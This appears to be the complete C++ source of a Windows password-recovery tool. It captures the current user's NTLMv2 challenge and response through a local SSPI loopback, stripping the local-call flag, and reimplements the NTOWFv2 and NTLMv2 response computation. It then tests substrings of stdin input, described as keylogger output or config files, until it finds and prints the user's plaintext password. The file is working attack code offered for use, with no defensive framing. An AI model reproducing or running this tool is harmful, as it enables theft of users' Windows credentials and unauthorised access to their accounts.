#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#define SECURITY_WIN32
#include <Security.h>
#include <Wincrypt.h>

#pragma comment(lib,"Secur32")

#define NTLMSSP_SIGNATURE "NTLMSSP"
#define MSV1_0_CHALLENGE_LENGTH 8

// important for memory alignement !!!!!!!!!!!!!!!
// we align the data to be the exact representation of the struct.
// however, if the alignment is not back to default,
// you will have a surprise when using struct to systemcall
// ex: using UNICODE_STRING
// the pack is retablished before the end of this file
#pragma pack(push,1)


typedef enum {
    NtLmNegotiate = 1,
    NtLmChallenge,
    NtLmAuthenticate,
    NtLmUnknown
} NTLM_MESSAGE_TYPE;

typedef struct _STRING32 {
  USHORT Length;
  USHORT MaximumLength;
  DWORD  Offset;
} STRING32, *PSTRING32;

//
// Valid values of NegotiateFlags
//

#define NTLMSSP_NEGOTIATE_UNICODE               0x00000001  // Text strings are in unicode
#define NTLMSSP_NEGOTIATE_OEM                   0x00000002  // Text strings are in OEM
#define NTLMSSP_REQUEST_TARGET                  0x00000004  // Server should return its authentication realm

#define NTLMSSP_NEGOTIATE_SIGN                  0x00000010  // Request signature capability
#define NTLMSSP_NEGOTIATE_SEAL                  0x00000020  // Request confidentiality
#define NTLMSSP_NEGOTIATE_DATAGRAM              0x00000040  // Use datagram style authentication
#define NTLMSSP_NEGOTIATE_LM_KEY                0x00000080  // Use LM session key for sign/seal

#define NTLMSSP_NEGOTIATE_NETWARE               0x00000100  // NetWare authentication
#define NTLMSSP_NEGOTIATE_NTLM                  0x00000200  // NTLM authentication
#define NTLMSSP_NEGOTIATE_NT_ONLY               0x00000400  // NT authentication only (no LM)
#define NTLMSSP_NEGOTIATE_NULL_SESSION          0x00000800  // NULL Sessions on NT 5.0 and beyand
	
#define NTLMSSP_NEGOTIATE_OEM_DOMAIN_SUPPLIED       0x1000  // Domain Name supplied on negotiate
#define NTLMSSP_NEGOTIATE_OEM_WORKSTATION_SUPPLIED  0x2000  // Workstation Name supplied on negotiate
#define NTLMSSP_NEGOTIATE_LOCAL_CALL            0x00004000  // Indicates client/server are same machine
#define NTLMSSP_NEGOTIATE_ALWAYS_SIGN           0x00008000  // Sign for all security levels
	
//
// Valid target types returned by the server in Negotiate Flags
//

#define NTLMSSP_TARGET_TYPE_DOMAIN              0x00010000  // TargetName is a domain name
#define NTLMSSP_TARGET_TYPE_SERVER              0x00020000  // TargetName is a server name
#define NTLMSSP_TARGET_TYPE_SHARE               0x00040000  // TargetName is a share name
#define NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY   0x00080000  // NTLM2 authentication added for NT4-SP4

#define NTLMSSP_NEGOTIATE_IDENTIFY              0x00100000  // Create identify level token

//
// Valid requests for additional output buffers
//

#define NTLMSSP_REQUEST_ACCEPT_RESPONSE         0x00200000  // get back session key, LUID
#define NTLMSSP_REQUEST_NON_NT_SESSION_KEY      0x00400000  // request non-nt session key
#define NTLMSSP_NEGOTIATE_TARGET_INFO           0x00800000  // target info present in challenge message

#define NTLMSSP_NEGOTIATE_EXPORTED_CONTEXT      0x01000000  // It's an exported context
#define NTLMSSP_NEGOTIATE_VERSION               0x02000000  // add the version field

#define NTLMSSP_NEGOTIATE_128                   0x20000000  // negotiate 128 bit encryption
#define NTLMSSP_NEGOTIATE_KEY_EXCH              0x40000000  // exchange a key using key exchange key
#define NTLMSSP_NEGOTIATE_56                    0x80000000  // negotiate 56 bit encryption

// flags used in client space to control sign and seal; never appear on the wire
#define NTLMSSP_APP_SEQ                 0x0040  // Use application provided seq num

#define MsvAvEOL                  0x0000
#define MsvAvNbComputerName       0x0001
#define MsvAvNbDomainName         0x0002
#define MsvAvNbDnsComputerName    0x0003
#define MsvAvNbDnsDomainName      0x0004
#define MsvAvNbDnsTreeName        0x0005
#define MsvAvFlags                0x0006
#define MsvAvTimestamp            0x0007
#define MsvAvRestrictions         0x0008
#define MsvAvTargetName           0x0009
#define MsvAvChannelBindings      0x000A



typedef struct _NTLM_VERSION
{
	BYTE ProductMajorVersion;
	BYTE ProductMinorVersion;
	USHORT ProductBuild;
	BYTE reserved[3];
	BYTE NTLMRevisionCurrent;
} NTLM_VERSION, *PNTLM_VERSION;

typedef struct _LMv1_RESPONSE
{
	BYTE Response[24];
} LMv1_RESPONSE, *PLMv1_RESPONSE;

typedef struct _LMv2_RESPONSE
{
	BYTE Response[16];
	BYTE ChallengeFromClient[8];
} LMv2_RESPONSE, *PLMv2_RESPONSE;

typedef struct _NTLMv1_RESPONSE
{
	BYTE Response[24];
} NTLMv1_RESPONSE, *PNTLMv1_RESPONSE;

typedef struct _NTLMv2_CLIENT_CHALLENGE
{
	BYTE RespType;
	BYTE HiRespType;
	USHORT Reserved1;
	DWORD Reserved2;
	ULONGLONG TimeStamp;
	BYTE ChallengeFromClient[8];
	DWORD Reserved3;
	BYTE AvPair[4];
} NTLMv2_CLIENT_CHALLENGE, *PNTLMv2_CLIENT_CHALLENGE;

typedef struct _NTLMv2_RESPONSE
{
	BYTE Response[16];
	NTLMv2_CLIENT_CHALLENGE Challenge;
} NTLMv2_RESPONSE, *PNTLMv2_RESPONSE;

typedef struct _NTLM_MESSAGE {
    UCHAR Signature[sizeof(NTLMSSP_SIGNATURE)];
    DWORD MessageType;
} NTLM_MESSAGE, *PNTLM_MESSAGE;

//
// Opaque message returned from first call to InitializeSecurityContext
//

typedef struct _NEGOTIATE_MESSAGE {
    UCHAR Signature[8];
    DWORD MessageType;
    DWORD NegotiateFlags;
    STRING32 OemDomainName;
    STRING32 OemWorkstationName;
} NEGOTIATE_MESSAGE, *PNEGOTIATE_MESSAGE;

typedef struct _NEGOTIATE_MESSAGE_WITH_VERSION {
    UCHAR Signature[8];
    DWORD MessageType;
    DWORD NegotiateFlags;
    STRING32 OemDomainName;
    STRING32 OemWorkstationName;
	NTLM_VERSION Version;
} NEGOTIATE_MESSAGE_WITH_VERSION, *PNEGOTIATE_MESSAGE_WITH_VERSION;

//
// Opaque message returned from second call to InitializeSecurityContext
//
typedef struct _CHALLENGE_MESSAGE {
    UCHAR Signature[8];
    DWORD MessageType;
    STRING32 TargetName;
    DWORD NegotiateFlags;
    UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
    ULONG64 ServerContextHandle;
    STRING32 TargetInfo;
} CHALLENGE_MESSAGE, *PCHALLENGE_MESSAGE;


typedef struct _CHALLENGE_MESSAGE_WITH_VERSION {
    UCHAR Signature[8];
    DWORD MessageType;
    STRING32 TargetName;
    DWORD NegotiateFlags;
    UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
    ULONG64 ServerContextHandle;
    STRING32 TargetInfo;
	NTLM_VERSION Version;
} CHALLENGE_MESSAGE_WITH_VERSION, *PCHALLENGE_MESSAGE_WITH_VERSION;
//
// Non-opaque message returned from second call to AcceptSecurityContext
//
typedef struct _AUTHENTICATE_MESSAGE {
    UCHAR Signature[8];
    DWORD MessageType;
    STRING32 LmChallengeResponse;
    STRING32 NtChallengeResponse;
    STRING32 DomainName;
    STRING32 UserName;
    STRING32 Workstation;
    STRING32 SessionKey;
    DWORD NegotiateFlags;
} AUTHENTICATE_MESSAGE, *PAUTHENTICATE_MESSAGE;

// page 29 for oid msavrestrictions
typedef struct _RESTRICTIONS_ENCODING {
	DWORD dwSize;
	DWORD dwReserved;
	DWORD dwIntegrityLevel;
	DWORD dwSubjectIntegrityLevel;
	BYTE MachineId[32];
} RESTRICTIONS_ENCODING, *PRESTRICTIONS_ENCODING;

#pragma pack(pop)

// MD4 encryption of the password
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


extern "C"
{
	// in advapi32.dll - no need to getprocaddress
	NTSTATUS WINAPI SystemFunction007 (PUNICODE_STRING string, LPBYTE hash);
}

typedef struct _KEY_BLOB {
  BYTE   bType;
  BYTE   bVersion;
  WORD   reserved;
  ALG_ID aiKeyAlg;
  ULONG keysize;
  BYTE Data[16];
} KEY_BLOB;


//global var
DWORD minPasswordLen = 1;
DWORD maxPasswordLen = 10;
WCHAR szDomainName[256+1] = L"";
WCHAR szUserName[256+1] = L"";
UCHAR Challenge[MSV1_0_CHALLENGE_LENGTH];
PNTLMv2_RESPONSE response = NULL;
PNTLMv2_CLIENT_CHALLENGE ClientChallenge = NULL;
DWORD dwClientChallengeSize = 0;


BOOL HMAC_MD5(PBYTE pbKey, PBYTE pbData, DWORD dwDataSize, BYTE hash[16])
{
	BOOL fReturn = FALSE;
	DWORD dwError = 0;
	HCRYPTPROV  hProv       = NULL;
	HCRYPTHASH  hHash = NULL;
	HCRYPTKEY   hKey        = NULL;
	HMAC_INFO   HmacInfo;
	ZeroMemory(&HmacInfo, sizeof(HmacInfo));
	HmacInfo.HashAlgid = CALG_MD5; 
	KEY_BLOB Blob;
	
	if (!CryptAcquireContext(
		&hProv,                   // handle of the CSP
		NULL,                     // key container name
		NULL,                     // CSP name
		PROV_RSA_FULL,            // provider type
		CRYPT_VERIFYCONTEXT))     // no key access is requested
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	ZeroMemory(&Blob, sizeof(Blob));
	memcpy(Blob.Data,pbKey,16);
	Blob.bType = PLAINTEXTKEYBLOB;
	Blob.bVersion = CUR_BLOB_VERSION;
	Blob.reserved = 0;
	Blob.aiKeyAlg = CALG_RC4;
	Blob.keysize = 16;
	if (!CryptImportKey(hProv, (PBYTE)&Blob, sizeof(Blob),NULL,0,&hKey))
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	if (!CryptCreateHash(hProv, CALG_HMAC, hKey, 0, &hHash))
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	if (!CryptSetHashParam(hHash, HP_HMAC_INFO, (BYTE*)&HmacInfo, 0))
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	if (!CryptHashData(hHash, pbData, dwDataSize, 0))
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	DWORD dwHashLen = 16;
	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &dwHashLen, 0))
	{
		dwError = GetLastError();
		goto HMACMD5ErrorExit;
	}
	fReturn = TRUE;

HMACMD5ErrorExit:
	if (hKey)
		CryptDestroyKey(hKey);
	if(hHash)
		CryptDestroyHash(hHash);
	if(hProv)
		CryptReleaseContext(hProv, 0);
	SetLastError(dwError);
	return fReturn;
}

BOOL ComputeNTOWFv2(PWSTR szDomain,PWSTR szUser,PWSTR szPassword, BYTE output[16])
{
	// defined page 60 of MS-NLMP
	memset(output,0,16);
	WCHAR szDataToHash[256 *2+1] = TEXT("");
	// checks
	if (szUser && wcslen(szUser)> 256 )
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	if (szDomain && wcslen(szDomain)> 256 )
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	if (!szPassword)
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	// first step : MD4 of the UNICODE password
	BYTE bHash[16];
	UNICODE_STRING UnicodePassword;
	UnicodePassword.Length = (USHORT) wcslen(szPassword) * sizeof(WCHAR);
	UnicodePassword.MaximumLength = (USHORT) wcslen(szPassword) * sizeof(WCHAR);
	UnicodePassword.Buffer = szPassword;
	DWORD Status = SystemFunction007(&UnicodePassword, bHash);
	if (Status != 0)
	{
		SetLastError(Status);
		return FALSE;
	}
	// second step : HMAC_MD5
	// concat user in uppercase then domain
	if (szUser)
	{
		wcscpy_s(szDataToHash, ARRAYSIZE(szDataToHash),szUser);
		_wcsupr_s(szDataToHash, ARRAYSIZE(szDataToHash));
	}
	if (szDomain)
	{
		wcscat_s(szDataToHash, ARRAYSIZE(szDataToHash),szDomain);
	}
	return HMAC_MD5(bHash,(PBYTE)szDataToHash,(DWORD)(wcslen(szDataToHash)*sizeof(WCHAR)),output);
}

BOOL ComputeNTLMv2Response(BYTE ServerChallenge[8],PNTLMv2_CLIENT_CHALLENGE ClientChallenge,DWORD dwClientChallengeSize,BYTE NTOWFv2[16], BYTE Response[16])
{
	DWORD dwError = 0;
	if (dwClientChallengeSize > 1000)
	{
		return FALSE;
	}
	BYTE pbGlobalChallenge[1000+8];
	memcpy(pbGlobalChallenge, ServerChallenge,8);
	memcpy(pbGlobalChallenge+8, ClientChallenge,dwClientChallengeSize);
	if (!HMAC_MD5(NTOWFv2,pbGlobalChallenge,dwClientChallengeSize+8,Response))
	{
		return FALSE;
	}
	SetLastError(0);
	return TRUE;
}


BOOL ComputeNTLMv2ResponseFromPassword(WCHAR szDomainName[15+1], WCHAR szUserName[256+1], WCHAR szPassword[256+1], BYTE ServerChallenge[8],PNTLMv2_CLIENT_CHALLENGE ClientChallenge,DWORD dwClientChallengeSize,BYTE Response[16])
{
	BYTE NTOWFv2[16];
	if (!ComputeNTOWFv2(szDomainName,szUserName,szPassword,NTOWFv2))
	{
		SetLastError(ERROR_INVALID_PASSWORD);
		return FALSE;
	}
	ZeroMemory(Response,16);
	if (!ComputeNTLMv2Response(ServerChallenge, ClientChallenge, dwClientChallengeSize, NTOWFv2, Response))
	{
		SetLastError(ERROR_INVALID_PASSWORD);
		return FALSE;
	}
	return TRUE;
}


BOOL GetNTLMChallengeAndResponse()
{
	CredHandle hCred;
	CredHandle hCredServer;
	TimeStamp Lifetime;
	TimeStamp LifetimeServer;
	DWORD ss = AcquireCredentialsHandle (
            NULL, 
            NTLMSP_NAME,
            SECPKG_CRED_OUTBOUND,
            NULL, 
            NULL, 
            NULL, 
            NULL, 
            &hCredServer,
            &LifetimeServer);

	if (ss != 0)
		return FALSE;

	ss = AcquireCredentialsHandle (
            NULL, 
            NTLMSP_NAME,
            SECPKG_CRED_INBOUND,
            NULL, 
            NULL, 
            NULL, 
            NULL, 
            &hCred,
            &Lifetime);
	
	if (ss != 0)
		return FALSE;

	SecBufferDesc NegotiateBuffDesc;
    SecBuffer NegotiateSecBuff;
	NegotiateBuffDesc.ulVersion = 0;
    NegotiateBuffDesc.cBuffers  = 1;
    NegotiateBuffDesc.pBuffers  = &NegotiateSecBuff;

    NegotiateSecBuff.cbBuffer   = 0;
    NegotiateSecBuff.BufferType = SECBUFFER_TOKEN;
    NegotiateSecBuff.pvBuffer   = NULL;

	SecBufferDesc ChallengeBuffDesc;
    SecBuffer ChallengeSecBuff;
	ChallengeBuffDesc.ulVersion = 0;
    ChallengeBuffDesc.cBuffers  = 1;
    ChallengeBuffDesc.pBuffers  = &ChallengeSecBuff;

    ChallengeSecBuff.cbBuffer   = 0;
    ChallengeSecBuff.BufferType = SECBUFFER_TOKEN;
    ChallengeSecBuff.pvBuffer   = NULL;

	SecBufferDesc AuthenticateBuffDesc;
    SecBuffer AuthenticateSecBuff;
	AuthenticateBuffDesc.ulVersion = 0;
    AuthenticateBuffDesc.cBuffers  = 1;
    AuthenticateBuffDesc.pBuffers  = &AuthenticateSecBuff;

    AuthenticateSecBuff.cbBuffer   = 0;
    AuthenticateSecBuff.BufferType = SECBUFFER_TOKEN;
    AuthenticateSecBuff.pvBuffer   = NULL;


	
	CtxtHandle ServerContextHandle = {0};
	ULONG ServerContextAttributes = 0;
	CtxtHandle ClientContextHandle = {0};
	ULONG ContextAttributes = 0;

	ss = InitializeSecurityContext(
                    &hCredServer,
                    NULL,               // No Client context yet
                    NULL,  // Faked target name
                    ISC_REQ_ALLOCATE_MEMORY| ISC_REQ_DELEGATE,
                    0,                  // Reserved 1
                    SECURITY_NATIVE_DREP,
                    NULL,                  // No initial input token
                    0,                  // Reserved 2
                    &ServerContextHandle,
                    &NegotiateBuffDesc,
                    &ServerContextAttributes,
                    &LifetimeServer );
	if (ss != 0x00090312)
		return FALSE;

	NEGOTIATE_MESSAGE* negotiate = (NEGOTIATE_MESSAGE* ) NegotiateBuffDesc.pBuffers[0].pvBuffer;
	//TraceNegotiateMessage((PBYTE) NegotiateBuffDesc.pBuffers[0].pvBuffer, NegotiateBuffDesc.pBuffers[0].cbBuffer);

	ss = AcceptSecurityContext(
                    &hCred,
                    NULL,               // No Server context yet
                    &NegotiateBuffDesc,
                    ISC_REQ_ALLOCATE_MEMORY  | ISC_REQ_DELEGATE,
                    SECURITY_NATIVE_DREP,
                    &ClientContextHandle,
                    &ChallengeBuffDesc,
                    &ContextAttributes,
                    &Lifetime );

	if (ss != 0x00090312)
		return FALSE;
		// client
	CHALLENGE_MESSAGE* challenge = (CHALLENGE_MESSAGE* ) ChallengeBuffDesc.pBuffers[0].pvBuffer;
	//TraceChallengeMessage((PBYTE) ChallengeBuffDesc.pBuffers[0].pvBuffer, ChallengeBuffDesc.pBuffers[0].cbBuffer);

	// when local call, windows remove the ntlm response
	challenge->NegotiateFlags &= ~NTLMSSP_NEGOTIATE_LOCAL_CALL;

	ss = InitializeSecurityContext(
                    &hCredServer,
                    &ServerContextHandle,               // No Client context yet
                    NULL,  // Faked target name
                    ISC_REQ_ALLOCATE_MEMORY| ISC_REQ_DELEGATE,
                    0,                  // Reserved 1
                    SECURITY_NATIVE_DREP,
                    &ChallengeBuffDesc,
                    0,                  // Reserved 2
                    &ServerContextHandle,
                    &AuthenticateBuffDesc,
                    &ServerContextAttributes,
                    &LifetimeServer );

	if (ss != 0)
		return FALSE;

	AUTHENTICATE_MESSAGE* authenticate = (AUTHENTICATE_MESSAGE* ) AuthenticateBuffDesc.pBuffers[0].pvBuffer;
	//TraceAuthenticateMessage((PBYTE) AuthenticateBuffDesc.pBuffers[0].pvBuffer, AuthenticateBuffDesc.pBuffers[0].cbBuffer);

	
	memcpy(szDomainName, ((PBYTE) authenticate + authenticate->DomainName.Offset), authenticate->DomainName.Length);
	szDomainName[ authenticate->DomainName.Length/2] = 0;
	
	memcpy(szUserName, ((PBYTE) authenticate + authenticate->UserName.Offset), authenticate->UserName.Length);
	szUserName[ authenticate->UserName.Length/2] = 0;

	memcpy(Challenge, challenge->Challenge,MSV1_0_CHALLENGE_LENGTH);
	response = (PNTLMv2_RESPONSE)((ULONG_PTR) authenticate + authenticate->NtChallengeResponse.Offset);
	
	ClientChallenge = &(response->Challenge);
	dwClientChallengeSize = authenticate->NtChallengeResponse.Length-16;
	return TRUE;
}

// assume max 20 char in password (< 20 is config, >20 is recompile)
#define MAX_CONFIGURABLE_PASSWORD_LEN 20

int _tmain(int argc, _TCHAR* argv[])
{
	// password len expected between 6 and 10
	// this is a CPU optimization
	minPasswordLen = 6;
	maxPasswordLen = 16;
	printf("Using min password length = %d and max password length = %d\r\n",minPasswordLen, maxPasswordLen);
	if (!GetNTLMChallengeAndResponse())
	{
		printf("Unable to Get NTLM Challenge And Response\r\n");
	}
	printf("Extract the password of the current user from flow (keylogger, config file, ..)\r\n");
	printf("Use SSPI to get a valid NTLM challenge/response and test passwords\r\n");
	printf("vincent.letoux@mysmartlogon.com\r\n");
	printf("\r\n");
	printf("[+] got NTLM challenge/response\r\n");

	DWORD passwordInBuffer = 0;
	WCHAR passwords[MAX_CONFIGURABLE_PASSWORD_LEN][MAX_CONFIGURABLE_PASSWORD_LEN] = {0};

	printf("[+] Reading stdin for password match\r\n");
	BOOL fContinue = TRUE;
	HANDLE hStdIn = GetStdHandle(STD_INPUT_HANDLE);

	while(fContinue)
    {
        CHAR c = 0;
		DWORD dwRead = 0;
		if (!ReadFile( hStdIn, &c, 1, &dwRead, NULL))
			break;
		if (c == '\r' || c == '\n')
		{
			passwordInBuffer = 0;
			continue;
		}
		for (DWORD dwI = minPasswordLen; dwI < maxPasswordLen; dwI++)
		{
			// stack
			if (passwordInBuffer < dwI)
			{
				passwords[dwI][passwordInBuffer] = c;
				if (passwordInBuffer + 1 < dwI)
				{
					// buffer not full - do not test
					continue;
				}
			}
			else
			{
				// or shift
				for (DWORD dwJ = 1 ; dwJ < passwordInBuffer && dwJ < dwI; dwJ++)
				{
					passwords[dwI][dwJ-1] = passwords[dwI][dwJ];
				}
				passwords[dwI][dwI-1] = c;
			}
			// test password
			BYTE expectedResponse[16];
			if (ComputeNTLMv2ResponseFromPassword(szDomainName, szUserName, passwords[dwI], Challenge,ClientChallenge,dwClientChallengeSize, expectedResponse))
			{
				if (memcmp(expectedResponse, response->Response, 16) == 0)
				{
					printf("[+] Found. Password is %S\r\n", passwords[dwI]);
					return 1;
				}
			}
		}
		passwordInBuffer++;
	}
	printf("[+] Password not found\r\n");
	return 0;
}


